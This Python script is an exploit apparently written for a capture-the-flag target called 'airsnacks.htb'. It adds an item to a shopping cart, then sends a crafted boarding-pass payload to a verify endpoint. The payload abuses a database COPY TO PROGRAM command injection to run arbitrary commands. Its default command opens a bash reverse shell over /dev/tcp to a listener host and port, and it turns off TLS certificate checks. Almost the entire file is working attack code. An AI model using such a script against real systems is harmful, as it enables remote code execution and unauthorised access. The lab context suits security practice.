#!/usr/bin/env python3
"""AirSnacks cart + BCBP verify. Default payload: COPY TO PROGRAM reverse shell."""
from __future__ import annotations

import argparse
import json
import ssl
import urllib.error
import urllib.request

from bcbp import copy_program


def session(target: str):
    ctx = ssl._create_unverified_context()
    return urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx)), ctx


def post(opener, url: str, obj: dict, timeout: float = 20):
    req = urllib.request.Request(
        url,
        data=json.dumps(obj).encode(),
        headers={"Content-Type": "application/json", "Host": "airsnacks.htb"},
    )
    try:
        with opener.open(req, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--target", required=True, help="box IP")
    p.add_argument("--sku", default="CNF-JLY-300")
    g = p.add_mutually_exclusive_group()
    g.add_argument("--cmd", help="COPY TO PROGRAM command")
    g.add_argument("--lhost", help="with --lport: bash reverse")
    p.add_argument("--lport", type=int, default=4444)
    p.add_argument("--timeout", type=float, default=12)
    args = p.parse_args()

    if args.cmd:
        cmd = args.cmd
    elif args.lhost:
        cmd = f'bash -c "bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1"'
    else:
        p.error("need --cmd or --lhost")

    base = f"https://{args.target}"
    opener, _ = session(args.target)
    st, body = post(opener, base + "/cart/add", {"sku": args.sku})
    print("[*] cart", st, body.strip()[:120])
    raw = copy_program(cmd)
    print(f"[*] BCBP len={len(raw)} cmd={cmd!r}")
    st, body = post(
        opener, base + "/checkout/boarding-pass/verify", {"raw": raw}, timeout=args.timeout
    )
    print("[*] verify", st, body[:300])


if __name__ == "__main__":
    main()
